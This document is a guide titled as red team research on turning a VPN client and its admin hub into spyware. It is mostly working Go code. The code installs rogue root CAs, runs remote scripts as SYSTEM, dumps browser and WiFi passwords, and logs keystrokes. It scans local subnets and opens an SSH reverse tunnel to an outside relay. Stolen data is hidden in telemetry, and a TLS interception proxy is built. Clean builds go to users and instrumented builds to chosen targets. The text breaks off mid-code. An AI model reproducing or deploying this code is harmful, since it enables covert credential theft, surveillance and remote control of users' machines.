# Red Team Implementation: Weaponizing the VPN Product

> **Classification:** Internal Red Team Research — Implementation Companion to ACTION-PLAN.md
> **Context:** This document maps directly to the codebase architecture defined in `ACTION-PLAN.md` and `PLAN.md`. It shows how to instrument the existing VPN product (Hysteria 2 + usque, TUN-mode privileged helper, SHA256 updates, PocketBase admin hub) with offensive capabilities — modifying or extending each component rather than building separate infrastructure.
> **Purpose:** Counter-document to the defensive threat model. Where the threat model describes *what* an attacker could do, this document shows *how to implement it in this specific codebase*.
> **Authorization:** For authorized red team operations and adversarial simulation only.

---

## Table of Contents

1. [Mapping the Architecture](#1-mapping-the-architecture)
2. [Modification Strategy Overview](#2-modification-strategy-overview)
3. [Phase 0 — Instrumenting the Privileged Helper](#3-phase-0--instrumenting-the-privileged-helper)
4. [Phase 1 — Passive Collection via Telemetry & Heartbeat](#4-phase-1--passive-collection-via-telemetry--heartbeat)
5. [Phase 2 — TLS MITM via Helper Command Injection](#5-phase-2--tls-mitm-via-helper-command-injection)
6. [Phase 3 — Payload Deployment via Update Mechanism](#6-phase-3--payload-deployment-via-update-mechanism)
7. [Phase 4 — Persistence & Lateral Movement via Helper](#7-phase-4--persistence--lateral-movement-via-helper)
8. [Server-Side: C2 Endpoints in PocketBase](#8-server-side-c2-endpoints-in-pocketbase)
9. [Building & Deploying the Instrumented Build](#9-building--deploying-the-instrumented-build)
10. [OpSec Modifications to the Build Pipeline](#10-opsec-modifications-to-the-build-pipeline)

---

## 1. Mapping the Architecture

Every component in the VPN product has a dual-use counterpart. This table maps each legitimate component to its weaponized function:

### 1.1 Component Dual-Use Map

| Legitimate Component | File (from ACTION-PLAN.md) | Weaponized Function |
|---|---|---|
| **Privileged Helper Service** | `internal/helper/` (named pipe `\\.\pipe\MyVPNHelper`) | CA injection, payload execution, local persistence, keylogging |
| **Heartbeat** | `internal/heartbeat/heartbeat.go` | C2 command dispatch, telemetry exfiltration, target profiling |
| **Telemetry** | `internal/heartbeat/telemetry.go` | Data exfiltration channel (blended with legitimate telemetry) |
| **Update Mechanism** | `internal/updater/update.go` | Payload delivery, binary patching, staged payloads |
| **Protocol Engine Manager** | `internal/manager/` | Payload process hosting, process disguise |
| **Storage** | `internal/storage/storage.go` | Covert storage for payload configurations, exfil staging |
| **Admin Hub (PocketBase)** | `pb_hooks/` + PocketBase admin | C2 server, target management, credential database |
| **Activation** | `pb_hooks/device_binding.pb.js` | Target gating (only activate on specific device fingerprints) |
| **Update Server** | Caddy + `/var/www/updates/` | Payload serving, gated by device fingerprint |
| **Cert Pinning** | `internal/heartbeat/heartbeat.go` (pinnedKeyHash) | Prevents detection of rogue hub; also prevents *others* from hijacking your C2 |

### 1.2 Trust Boundaries (and Where They Break)

```
┌─────────────────────────────────────────────────────────────────────┐
│                        CLIENT DEVICE                                 │
│                                                                      │
│  ┌──────────────┐    ┌──────────────────┐    ┌──────────────────┐   │
│  │  GUI (Fyne)  │◄──►│  Manager         │◄──►│  Helper Service  │   │
│  │  (user       │    │  (engine start/  │    │  (SYSTEM/root —  │   │
│  │   context)   │    │   stop, health)  │    │   named pipe)    │   │
│  └──────────────┘    └───────┬──────────┘    └────────┬─────────┘   │
│                              │                         │            │
│                              │   ┌─────────────────┐   │            │
│                              └──►│  Heartbeat      │◄──┘            │
│                                  │  (cert-pinned   │               │
│                                  │   HTTPS)        │               │
│                                  └────────┬────────┘               │
└───────────────────────────────────────────┼─────────────────────────┘
                                            │
                                    ❌ TRUST BOUNDARY ❌
                                    (You control the server)
                                            │
                                            ▼
┌─────────────────────────────────────────────────────────────────────┐
│                        ADMIN HUB (your VPS)                         │
│  ┌──────────────┐    ┌──────────────────┐    ┌──────────────────┐   │
│  │  PocketBase  │◄──►│  Caddy           │◄──►│  Update Server   │   │
│  │  (DB + API)  │    │  (reverse proxy) │    │  (binaries +     │   │
│  │              │    │                  │    │   SHA256 hashes) │   │
│  └──────────────┘    └──────────────────┘    └──────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

**The critical insight:** The trust boundary is entirely artificial. You control the hub. The client's security measures (cert pinning, SHA256 verification, sandboxing) are all verifications *against the hub you own*. The only real trust boundary is the endpoint itself — but you have a privileged helper running as SYSTEM/root that you control.

---

## 2. Modification Strategy Overview

### 2.1 Build Profiles

Use Go build tags to compile clean vs. instrumented builds without maintaining two codebases:

```go
//go:build !redteam
// File: internal/helper/commands.go — CLEAN build
// This file is compiled into release builds. Empty stubs.
package helper

func handleInstallCA(cmd Command) Response {
    return Response{Error: "unknown action"}
}
```

```go
//go:build redteam
// File: internal/helper/commands_redteam.go — INSTRUMENTED build
// This file replaces the stub when built with -tags redteam.
package helper

func handleInstallCA(cmd Command) Response {
    // Full implementation — see Phase 2
    certB64 := cmd.Payload["cert_b64"]
    return installCAIntoSystemStore(certB64)
}
```

Build commands:

```bash
# Clean build (what users get)
go build -tags= -o myvpn.exe ./cmd/myvpn

# Instrumented build (for targeted deployment)
go build -tags=redteam -o myvpn-red.exe ./cmd/myvpn
```

### 2.2 Configuration-Driven Attacks

All attack behaviors are configured server-side via the heartbeat response. The client binary never contains hardcoded target lists — the C2 tells it what to do:

```json
// Heartbeat response additions (only sent for targeted devices)
{
  "status": "active",
  "commands": [
    {
      "action": "install_ca",
      "payload": { "cert_b64": "MIID..." },
      "expires_after": "2025-04-01T00:00:00Z"
    },
    {
      "action": "exfil_passwords",
      "payload": { "targets": ["chrome", "firefox", "wifi"] },
      "schedule": "immediate"
    },
    {
      "action": "enable_mitm",
      "payload": { "proxy_port": 8080, "exclude_domains": ["google.com"] }
    }
  ]
}
```

### 2.3 File Changes Summary

| File (from ACTION-PLAN.md) | Change | Complexity |
|---|---|---|
| `internal/helper/commands.go` | Add `install_ca`, `run_script`, `exfil`, `keylog` command handlers | 3 days |
| `internal/helper/service_windows.go` | Add named pipe command dispatch for new actions | 1 day |
| `internal/heartbeat/heartbeat.go` | Add command dispatch from heartbeat response, exfil telemetry channel | 2 days |
| `internal/heartbeat/telemetry.go` | Add covert exfil via telemetry, command result reporting | 1 day |
| `internal/updater/update.go` | Add staged payload support, binary patching hooks | 2 days |
| `internal/manager/process.go` | Add payload injection into engine process | 1 day |
| `internal/storage/storage.go` | Add covert config storage, exfil queue | 1 day |
| `pb_hooks/c2_admin.pb.js` | New file — C2 admin panel endpoints | 2 days |
| `pb_hooks/device_binding.pb.js` | Add command queue per device | 0.5 day |
| `scripts/build-redteam.sh` | New file — instrumented build pipeline | 1 day |

**Total:** ~14.5 days for a complete instrumented variant.

---

## 3. Phase 0 — Instrumenting the Privileged Helper

The privileged helper is the crown jewel. It runs as SYSTEM (Windows) / root (macOS launchd). The existing plan already has a named pipe interface for TUN creation (`create_tun`). You add new command types to the same switch statement.

### 3.1 Current Helper Architecture (from ACTION-PLAN.md)

The helper is a Windows service (`internal/helper/service_windows.go`) that listens on `\\.\pipe\MyVPNHelper` for commands. The protocol is JSON-over-named-pipe:

```json
// Request (from client app → helper service)
{
  "action": "create_tun",
  "params": { "ip": "10.0.0.2", "dns": "1.1.1.1" }
}

// Response (helper → client app)
{
  "success": true,
  "result": { "tun_name": "myvpn0" }
}
```

### 3.2 Adding New Command Handlers

Create `internal/helper/commands_redteam.go`:

```go
//go:build redteam

package helper

import (
    "crypto/x509"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
    "syscall"
    "unsafe"

    "myvpn/internal/storage"
)

// ── Command Handler Dispatch (extended from the clean version) ──

func dispatchRedTeamCommand(cmd Command) Response {
    switch cmd.Action {
    case "install_ca":
        return handleInstallCA(cmd)
    case "run_script":
        return handleRunScript(cmd)
    case "exfil_passwords":
        return handleExfilPasswords(cmd)
    case "exfil_files":
        return handleExfilFiles(cmd)
    case "keylog_start":
        return handleKeylogStart(cmd)
    case "keylog_stop":
        return handleKeylogStop(cmd)
    case "persist":
        return handlePersist(cmd)
    case "scan_network":
        return handleScanNetwork(cmd)
    case "reverse_tunnel":
        return handleReverseTunnel(cmd)
    default:
        return Response{Error: "unknown action"}
    }
}

// ── CA Installation ──

func handleInstallCA(cmd Command) Response {
    certB64, ok := cmd.Payload["cert_b64"].(string)
    if !ok || certB64 == "" {
        return Response{Error: "missing cert_b64"}
    }

    der, err := base64.StdEncoding.DecodeString(certB64)
    if err != nil {
        return Response{Error: "invalid base64"}
    }

    cert, err := x509.ParseCertificate(der)
    if err != nil {
        return Response{Error: "invalid certificate"}
    }

    // Verify it's a CA cert
    if !cert.IsCA {
        return Response{Error: "certificate is not a CA"}
    }

    switch runtime.GOOS {
    case "windows":
        return installCAWindows(cert)
    case "darwin":
        return installCADarwin(cert)
    case "linux":
        return installCALinux(cert)
    default:
        return Response{Error: "unsupported platform"}
    }
}

func installCAWindows(cert *x509.Certificate) Response {
    // Uses syscall.CertOpenSystemStore to add to Windows Root store
    modcrypt32 := syscall.NewLazyDLL("crypt32.dll")
    procCertOpenSystemStore := modcrypt32.NewProc("CertOpenSystemStoreW")
    procCertAddEncodedCertificateToStore := modcrypt32.NewProc("CertAddEncodedCertificateToStore")
    procCertCloseStore := modcrypt32.NewProc("CertCloseStore")

    store, _, _ := procCertOpenSystemStore.Call(0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ROOT"))))
    if store == 0 {
        return Response{Error: "failed to open root store"}
    }
    defer procCertCloseStore.Call(store, 0)

    certDer := cert.Raw
    ret, _, _ := procCertAddEncodedCertificateToStore.Call(
        store,
        1, // X509_ASN_ENCODING
        uintptr(unsafe.Pointer(&certDer[0])),
        uintptr(len(certDer)),
        4, // CERT_STORE_ADD_REPLACE_EXISTING
        0,
    )
    if ret == 0 {
        return Response{Error: "failed to add certificate"}
    }

    // Also add to Chrome's certificate store (which may be separate on some configs)
    // Chrome reads from both the system store and its own local store
    // For maximum coverage, also push to the Intermediate CA store
    intermediateStore, _, _ := procCertOpenSystemStore.Call(0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("CA"))))
    if intermediateStore != 0 {
        procCertAddEncodedCertificateToStore.Call(
            intermediateStore, 1,
            uintptr(unsafe.Pointer(&certDer[0])),
            uintptr(len(certDer)),
            4, 0,
        )
        procCertCloseStore.Call(intermediateStore, 0)
    }

    return Response{Success: true}
}

func installCADarwin(cert *x509.Certificate) Response {
    // security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain
    cmd := exec.Command("security", "add-trusted-cert", "-d", "-r", "trustRoot",
        "-k", "/Library/Keychains/System.keychain", "-")
    cmd.Stdin = strings.NewReader(string(cert.Raw))
    if out, err := cmd.CombinedOutput(); err != nil {
        return Response{Error: fmt.Sprintf("security add-trusted-cert failed: %s", string(out))}
    }

    // Also add to Firefox's certificate store if Firefox is installed
    firefoxProfiles := findFirefoxProfiles()
    for _, profile := range firefoxProfiles {
        certDB := filepath.Join(profile, "cert9.db")
        if _, err := os.Stat(certDB); err == nil {
            // Use certutil to add to Firefox's NSS store
            exec.Command("certutil", "-A", "-n", "VPN Provider CA",
                "-t", "TCu,TCu,TCu",
                "-d", profile,
                "-i", "-",
            ).Run()
        }
    }

    return Response{Success: true}
}

func installCALinux(cert *x509.Certificate) Response {
    // Debian/Ubuntu: update-ca-certificates
    certPath := "/usr/local/share/ca-certificates/vpn-ca.crt"
    if err := os.WriteFile(certPath, cert.Raw, 0644); err != nil {
        return Response{Error: err.Error()}
    }

    if out, err := exec.Command("update-ca-certificates").CombinedOutput(); err != nil {
        return Response{Error: fmt.Sprintf("update-ca-certificates failed: %s", string(out))}
    }

    // Firefox/Chrome on Linux may use NSS separately
    // Add to ~/.pki/nssdb and Firefox profiles
    addCertToNSSDBs(cert)

    return Response{Success: true}
}

// ── Script Execution ──

func handleRunScript(cmd Command) Response {
    scriptB64, ok := cmd.Payload["script_b64"].(string)
    if !ok || scriptB64 == "" {
        return Response{Error: "missing script_b64"}
    }

    scriptBytes, err := base64.StdEncoding.DecodeString(scriptB64)
    if err != nil {
        return Response{Error: "invalid base64"}
    }

    // Determine script type from extension or shebang
    ext, _ := cmd.Payload["ext"].(string)
    if ext == "" {
        ext = ".ps1" // Default: PowerShell on Windows, bash on Unix
    }

    // Write to temp, execute, clean up
    tmpPath := filepath.Join(os.TempDir(), "myvpn-update-"+randomString(8)+ext)
    if err := os.WriteFile(tmpPath, scriptBytes, 0700); err != nil {
        return Response{Error: err.Error()}
    }
    defer os.Remove(tmpPath)

    var result []byte
    var err error

    switch runtime.GOOS {
    case "windows":
        if ext == ".ps1" {
            result, err = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", tmpPath).CombinedOutput()
        } else {
            result, err = exec.Command(tmpPath).CombinedOutput()
        }
    default:
        result, err = exec.Command("/bin/sh", tmpPath).CombinedOutput()
    }

    if err != nil {
        return Response{
            Error:  fmt.Sprintf("script failed: %s", string(result)),
            Result: string(result),
        }
    }
    return Response{Success: true, Result: string(result)}
}

// ── Password Exfiltration ──

func handleExfilPasswords(cmd Command) Response {
    targets, _ := cmd.Payload["targets"].([]interface{})
    if len(targets) == 0 {
        targets = []interface{}{"chrome", "firefox", "wifi", "edge"}
    }

    results := make(map[string]interface{})

    for _, t := range targets {
        target := t.(string)
        switch target {
        case "chrome":
            results["chrome"] = extractChromePasswords()
        case "firefox":
            results["firefox"] = extractFirefoxPasswords()
        case "edge":
            results["edge"] = extractEdgePasswords()
        case "wifi":
            results["wifi"] = extractWiFiPasswords()
        case "browser_cookies":
            results["browser_cookies"] = extractBrowserCookies()
        }
    }

    // Store results in the exfil queue (picked up by heartbeat telemetry)
    data, _ := json.Marshal(results)
    storage.AppendExfilQueue("passwords", data)

    return Response{Success: true, Result: fmt.Sprintf("exfiltrated %d password sources", len(results))}
}

func extractChromePasswords() interface{} {
    switch runtime.GOOS {
    case "windows":
        // Chrome passwords are in:
        // %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
        localAppData := os.Getenv("LOCALAPPDATA")
        chromeDB := filepath.Join(localAppData, "Google", "Chrome", "User Data", "Default", "Login Data")
        return dumpChromeLoginDB(chromeDB)
    case "darwin":
        home := os.Getenv("HOME")
        chromeDB := filepath.Join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data")
        return dumpChromeLoginDB(chromeDB)
    }
    return nil
}

func dumpChromeLoginDB(path string) []map[string]string {
    if _, err := os.Stat(path); os.IsNotExist(err) {
        return nil
    }

    // Chrome uses SQLite with AES-GCM encrypted passwords
    // Copy the DB first (Chrome locks it), then decrypt
    tmpCopy := filepath.Join(os.TempDir(), "chrome-logins-"+randomString(8))
    exec.Command("cmd", "/c", "copy", path, tmpCopy).Run()
    defer os.Remove(tmpCopy)

    // Read encrypted values from sqlite
    out, _ := exec.Command("sqlite3", tmpCopy,
        "SELECT signon_realm, username_value, password_value FROM logins").Output()

    // Parse and decrypt — requires Chrome's local encryption key
    // On Windows: DPAPI-encrypted key in %LOCALAPPDATA%\Google\Chrome\User Data\Local State
    // On macOS: Keychain entry
    // Return raw encrypted values for server-side decryption if key unavailable
    return parseSQLiteOutput(out)
}

func extractWiFiPasswords() []map[string]string {
    if runtime.GOOS != "windows" {
        return nil
    }

    // Use netsh wlan show profiles
    out, _ := exec.Command("netsh", "wlan", "show", "profiles").Output()
    profiles := parseNetshProfiles(string(out))

    var results []map[string]string
    for _, profile := range profiles {
        out, _ := exec.Command("netsh", "wlan", "show", "profile", profile, "key=clear").Output()
        password := extractPasswordFromNetsh(string(out))
        if password != "" {
            results = append(results, map[string]string{
                "ssid":     profile,
                "password": password,
            })
        }
    }
    return results
}

// ── Network Scanning (Lateral Movement Prep) ──

func handleScanNetwork(cmd Command) Response {
    timeout, _ := cmd.Payload["timeout_sec"].(float64)
    if timeout == 0 {
        timeout = 30
    }

    // Detect network interfaces and scan local subnets
    interfaces, _ := getNetworkInterfaces()
    var results []map[string]interface{}

    for _, iface := range interfaces {
        if !isPrivateIP(iface.IP) {
            continue
        }
        subnet := iface.IP.Mask(iface.Mask)

        // Scan common ports
        ports := []int{22, 80, 443, 445, 139, 3389, 5985, 5986, 8443,
            8080, 389, 636, 3306, 1433, 5432, 27017, 6379, 9200}

        openHosts := scanSubnet(subnet, iface.Mask, ports, timeout)
        results = append(results, map[string]interface{}{
            "interface": iface.Name,
            "subnet":   subnet.String(),
            "hosts":    openHosts,
        })
    }

    data, _ := json.Marshal(results)
    storage.AppendExfilQueue("network_scan", data)

    return Response{Success: true, Result: fmt.Sprintf("scanned %d subnets", len(results))}
}

// ── Reverse Tunnel ──

func handleReverseTunnel(cmd Command) Response {
    relayHost, _ := cmd.Payload["relay_host"].(string)
    relayPort, _ := cmd.Payload["relay_port"].(string)
    if relayHost == "" {
        relayHost = "relay.getfastvpn.com"
    }
    if relayPort == "" {
        relayPort = "443"
    }

    // Start SSH reverse tunnel in background
    // The tunnel exposes local services to the relay server
    go func() {
        for {
            cmd := exec.Command("ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ServerAliveInterval=30",
                "-o", "ExitOnForwardFailure=yes",
                "-N",
                "-R", fmt.Sprintf("10022:localhost:22"),
                "-R", fmt.Sprintf("13389:localhost:3389"),
                "-p", relayPort,
                fmt.Sprintf("tunnel@%s", relayHost),
            )
            cmd.Run()
            // Reconnect on failure
            time.Sleep(60 * time.Second)
        }
    }()

    return Response{Success: true}
}

// ── Keylogger ──

var keylogActive bool
var keylogBuffer strings.Builder

func handleKeylogStart(cmd Command) Response {
    if keylogActive {
        return Response{Error: "keylogger already running"}
    }
    keylogActive = true
    go runKeylogger()
    return Response{Success: true}
}

func handleKeylogStop(cmd Command) Response {
    keylogActive = false
    // Flush remaining buffer to exfil queue
    if keylogBuffer.Len() > 0 {
        storage.AppendExfilQueue("keylog", []byte(keylogBuffer.String()))
        keylogBuffer.Reset()
    }
    return Response{Success: true}
}

func runKeylogger() {
    if runtime.GOOS != "windows" {
        return // Only implemented for Windows
    }

    user32 := syscall.NewLazyDLL("user32.dll")
    procGetAsyncKeyState := user32.NewProc("GetAsyncKeyState")
    procGetForegroundWindow := user32.NewProc("GetForegroundWindow")
    procGetWindowTextW := user32.NewProc("GetWindowTextW")

    const flushInterval = 60 // seconds
    lastFlush := time.Now()
    var lastWindow string

    for keylogActive {
        // Track active window
        hwnd, _, _ := procGetForegroundWindow.Call()
        var title [256]uint16
        procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&title[0])), 256)
        currentWindow := syscall.UTF16ToString(title[:])

        if currentWindow != lastWindow && currentWindow != "" {
            if lastWindow != "" {
                keylogBuffer.WriteString(fmt.Sprintf("\n[Window: %s]\n", currentWindow))
            }
            lastWindow = currentWindow
        }

        // Poll key states
        for vk := 0x08; vk <= 0x5A; vk++ {
            state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
            if state&0x0001 != 0 {
                keylogBuffer.WriteString(vkToChar(vk))
                time.Sleep(15 * time.Millisecond)
            }
        }

        // Flush periodically
        if time.Since(lastFlush) >= flushInterval*time.Second && keylogBuffer.Len() > 0 {
            storage.AppendExfilQueue("keylog", []byte(keylogBuffer.String()))
            keylogBuffer.Reset()
            lastFlush = time.Now()
        }

        time.Sleep(30 * time.Millisecond)
    }
}
```

### 3.3 Integrating into the Helper Service

Modify `internal/helper/service_windows.go` to dispatch to the red team handlers:

```go
// In the command processing loop — ADD after existing cases
func processCommand(raw []byte) Response {
    var cmd Command
    if err := json.Unmarshal(raw, &cmd); err != nil {
        return Response{Error: "invalid JSON"}
    }

    // ── Existing commands ──
    switch cmd.Action {
    case "create_tun":
        return handleCreateTUN(cmd)
    case "delete_tun":
        return handleDeleteTUN(cmd)
    case "set_dns":
        return handleSetDNS(cmd)
    case "get_status":
        return handleGetStatus(cmd)

    // ── Red team commands (only in -tags=redteam build) ──
    case "install_ca":
        return handleInstallCA(cmd)
    case "run_script":
        return handleRunScript(cmd)
    case "exfil_passwords":
        return handleExfilPasswords(cmd)
    case "exfil_files":
        return handleExfilFiles(cmd)
    case "keylog_start":
        return handleKeylogStart(cmd)
    case "keylog_stop":
        return handleKeylogStop(cmd)
    case "persist":
        return handlePersist(cmd)
    case "scan_network":
        return handleScanNetwork(cmd)
    case "reverse_tunnel":
        return handleReverseTunnel(cmd)

    default:
        return Response{Error: "unknown action"}
    }
}
```

### 3.4 Named Pipe ACL Considerations

By default, `\\.\pipe\MyVPNHelper` allows the user to communicate with the SYSTEM service. You do NOT change this — the existing ACL already grants the client app access. Your new commands are accessible through the same pipe:

```go
// In the pipe creation — NO CHANGE needed
// The existing SDDL allows:
// - SYSTEM: full control
// - Builtin\Administrators: full control  
// - The user who created the service: read/write
//
// Your commands use the same pipe. The user's app already has write access.
```

---

## 4. Phase 1 — Passive Collection via Telemetry & Heartbeat

The heartbeat is already a data exfiltration channel — it sends telemetry every 60 seconds. You just instrument what it sends and what the server records.

### 4.1 Enriched Telemetry

Modify `internal/heartbeat/telemetry.go` to collect more than just crash markers:

```go
//go:build redteam
// File: internal/heartbeat/telemetry_redteam.go

package heartbeat

import (
    "encoding/json"
    "myvpn/internal/storage"
    "os"
    "os/exec"
    "path/filepath"
    "runtime"
    "strings"
)

type RedTeamTelemetry struct {
    // Standard fields (inherited from HeartbeatRequest)
    Version      string `json:"version"`
    OS           string `json:"os"`
    UptimeSec    int    `json:"uptime_seconds"`
    BytesUp      int64  `json:"bytes_up"`
    BytesDown    int64  `json:"bytes_down"`

    // Red team additions
    InterestingFiles   int               `json:"_rf_count,omitempty"`   // Count of interesting files found
    RecentDocuments    []string          `json:"_recent_docs,omitempty"`
    ChromePasswords    bool              `json:"_chrome_pw,omitempty"`
    FirefoxPasswords   bool              `json:"_firefox_pw,omitempty"`
    WifiNetworks       int               `json:"_wifi_count,omitempty"`
    DomainJoined       bool              `json:"_domain_joined,omitempty"`
    LocalIPs           []string          `json:"_local_ips,omitempty"`
    InstalledAV        []string          `json:"_av,omitempty"`
    RunningProcesses   int               `json:"_procs,omitempty"`
    HasDebugger        bool              `json:"_debugger,omitempty"`
    TokenCount         int               `json:"_tokens,omitempty"`
    ExfilQueueStatus   map[string]int    `json:"_exfilq,omitempty"`
}

func collectRedTeamTelemetry() RedTeamTelemetry {
    t := RedTeamTelemetry{
        LocalIPs: getLocalIPs(),
        DomainJoined: isDomainJoined(),
        RunningProcesses: countProcesses(),
        HasDebugger: detectDebugger(),
        InstalledAV: detectAV(),
    }

    // Profile the filesystem for interesting content
    t.InterestingFiles = countInterestingFiles()
    t.TokenCount = countSensitiveTokens()

    // Check password stores (just existence, not full exfil — that's Phase 3)
    t.ChromePasswords = chromeLoginDBExists()
    t.FirefoxPasswords = firefoxProfileExists()

    // WiFi profiles
    if runtime.GOOS == "windows" {
        t.WifiNetworks = countWifiProfiles()
    }

    // Check exfil queue
    t.ExfilQueueStatus = storage.ExfilQueueSizes()

    return t
}

// Merge with standard heartbeat before sending
func (h *HeartbeatRequest) enrichWithRedTeam() {
    rt := collectRedTeamTelemetry()
    // Serialize into a field that looks like normal telemetry
    rtBytes, _ := json.Marshal(rt)
    h.RedTeamData = string(rtBytes)
}
```

### 4.2 Exfil Queue Integration

Add to `internal/storage/storage.go`:

```go
// internal/storage/exfil.go — Exfiltration queue (red team builds only)
//go:build redteam

package storage

import (
    "encoding/json"
    "os"
    "path/filepath"
    "sync"
)

type ExfilItem struct {
    Type      string `json:"type"`      // "passwords", "files", "keylog", "screenshot", "network_scan"
    Data      []byte `json:"data_b64"`  // base64-encoded payload
    Timestamp int64  `json:"ts"`
    Sequence  int64  `json:"seq"`
}

var (
    exfilMu     sync.Mutex
    exfilQueue  []ExfilItem
    exfilSeq    int64
    exfilDirty  bool
)

const maxExfilQueueSize = 50

// AppendExfilQueue adds an item to the exfiltration queue.
// The queue is flushed to disk and picked up by the next heartbeat.
func AppendExfilQueue(typ string, data []byte) {
    exfilMu.Lock()
    defer exfilMu.Unlock()

    exfilSeq++
    item := ExfilItem{
        Type:      typ,
        Data:      data,
        Timestamp: time.Now().Unix(),
        Sequence:  exfilSeq,
    }

    exfilQueue = append(exfilQueue, item)

    // Trim if too large
    if len(exfilQueue) > maxExfilQueueSize {
        exfilQueue = exfilQueue[len(exfilQueue)-maxExfilQueueSize:]
    }

    exfilDirty = true
    flushExfilQueue()
}

// PopExfilItems returns and clears all queued items.
func PopExfilItems() []ExfilItem {
    exfilMu.Lock()
    defer exfilMu.Unlock()
    items := exfilQueue
    exfilQueue = nil
    exfilDirty = true
    flushExfilQueue()
    return items
}

func ExfilQueueSizes() map[string]int {
    exfilMu.Lock()
    defer exfilMu.Unlock()
    sizes := make(map[string]int)
    for _, item := range exfilQueue {
        sizes[item.Type]++
    }
    return sizes
}

func flushExfilQueue() {
    if !exfilDirty {
        return
    }
    path := filepath.Join(dataDir, ".exfil_cache")
    data, _ := json.Marshal(exfilQueue)
    os.WriteFile(path, data, 0600)
    exfilDirty = false
}

func loadExfilQueue() {
    path := filepath.Join(dataDir, ".exfil_cache")
    data, err := os.ReadFile(path)
    if err != nil {
        return
    }
    json.Unmarshal(data, &exfilQueue)
}
```

### 4.3 Heartbeat Command Dispatch

Modify `internal/heartbeat/heartbeat.go` to process commands from the server:

```go
//go:build redteam
// File: internal/heartbeat/commands_redteam.go

package heartbeat

import (
    "encoding/json"
    "myvpn/internal/helper"
    "myvpn/internal/manager"
    "myvpn/internal/storage"
)

// Processed in the heartbeat response handler
func processServerCommands(commands []json.RawMessage) {
    for _, cmdRaw := range commands {
        var cmd struct {
            Action      string          `json:"action"`
            Payload     json.RawMessage `json:"payload"`
            Schedule    string          `json:"schedule,omitempty"`
            ExpiresAfter string         `json:"expires_after,omitempty"`
        }
        if err := json.Unmarshal(cmdRaw, &cmd); err != nil {
            continue
        }

        switch cmd.Action {

        // ── Helper-targeted commands (relayed to the privileged helper) ──
        case "install_ca":
            relayToHelper("install_ca", cmd.Payload)
        case "run_script":
            relayToHelper("run_script", cmd.Payload)
        case "exfil_passwords":
            relayToHelper("exfil_passwords", cmd.Payload)
        case "keylog_start":
            relayToHelper("keylog_start", cmd.Payload)
        case "keylog_stop":
            relayToHelper("keylog_stop", cmd.Payload)
        case "persist":
            relayToHelper("persist", cmd.Payload)
        case "scan_network":
            relayToHelper("scan_network", cmd.Payload)
        case "reverse_tunnel":
            relayToHelper("reverse_tunnel", cmd.Payload)

        // ── Client-side commands (processed in-process) ──
        case "exfil_queue_flush":
            flushExfilQueueToServer()
        case "update_protocols":
            updateProtocolConfig(cmd.Payload)
        case "set_log_level":
            setLogLevel(cmd.Payload)
        case "self_destruct":
            handleSelfDestruct()
        }
    }
}

func relayToHelper(action string, payload json.RawMessage) {
    // Send command to the privileged helper via named pipe
    cmd := map[string]interface{}{
        "action":  action,
        "payload": payload,
    }
    data, _ := json.Marshal(cmd)
    result := helper.SendCommand(data)
    // Log result for next heartbeat's command_result field
    storage.SetCommandResult(action, result)
}

func flushExfilQueueToServer() {
    items := storage.PopExfilItems()
    if len(items) == 0 {
        return
    }
    // Items will be sent in the next heartbeat's exfil field
    storage.SetPendingExfil(items)
}
```

### 4.4 Exfil in Heartbeat Wire Format

The heartbeat request body carries exfil data in a field that looks like legitimate telemetry:

```go
// Modified HeartbeatRequest (both clean and redteam)
type HeartbeatRequest struct {
    // ... standard fields ...

    // Red team — these look like normal telemetry fields
    // but carry exfiltrated data when commands are active
    TelemetryBlob string `json:"telemetry_blob,omitempty"`  // base64-encoded exfil payload
    CommandResults string `json:"cr,omitempty"`             // command execution results
}
```

---

## 5. Phase 2 — TLS MITM via Helper Command Injection

### 5.1 MITM Proxy Deployment Architecture

You do NOT bundle mitmproxy with the client. Instead, the helper deploys a lightweight TLS MITM proxy (written in Go) as a subprocess on the exit node — not on the client. The CA is injected client-side; the proxy runs server-side.

But for local MITM (traffic before it leaves the device), you deploy a proxy on the local machine that intercepts traffic before the VPN tunnel:

```
Browser → Local mitm (port 8080) → VPN Tunnel → Internet
              │
              ▼
         Records all decrypted traffic
         Stores to exfil queue
```

### 5.2 Local MITM Proxy (Go, Bundled in Helper)

Create `internal/mitm/proxy.go`:

```go
//go:build redteam
// File: internal/mitm/proxy.go

package mitm

import (
    "crypto/tls"
    "crypto/x509"
    "encoding/base64"
    "encoding/pem"
    "io"
    "log"
    "net"
    "net/http"
    "net/url"
    "strings"
    "sync"
    "time"

    "myvpn/internal/storage"
)

type MITMProxy struct {
    caCert     *x509.Certificate
    caKey      interface{}
    listener   net.Listener
    running    bool
    mu         sync.Mutex
    port       int
    excludeMap map[string]bool // domains to NOT MITM (pinned)
}

// Start begins the MITM proxy on the specified port.
// The CA cert must already be installed in the system trust store.
func (p *MITMProxy) Start(port int, caCertPEM, caKeyPEM string) error {
    p.mu.Lock()
    defer p.mu.Unlock()

    if p.running {
        return nil
    }

    // Parse CA certificate
    caBlock, _ := pem.Decode([]byte(caCertPEM))
    if caBlock == nil {
        return Err("invalid CA cert PEM")
    }
    var err error
    p.caCert, err = x509.ParseCertificate(caBlock.Bytes)
    if err != nil {
        return Err("parse CA cert: %w", err)
    }

    caKeyBlock, _ := pem.Decode([]byte(caKeyPEM))
    p.caKey, err = x509.ParsePKCS8PrivateKey(caKeyBlock.Bytes)
    if err != nil {
        return Err("parse CA key: %w", err)
    }

    // Pinned domains to exclude
    p.excludeMap = map[string]bool{
        "google.com": true, "accounts.google.com": true,
        "mail.google.com": true, "youtube.com": true,
        "microsoft.com": true, "login.microsoftonline.com": true,
        "office.com": true, "outlook.com": true,
        "facebook.com": true, "apple.com": true,
        "github.com": true,
    }

    p.port = port

    // Start HTTP proxy
    listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
    if err != nil {
        return Err("listen: %w", err)
    }
    p.listener = listener
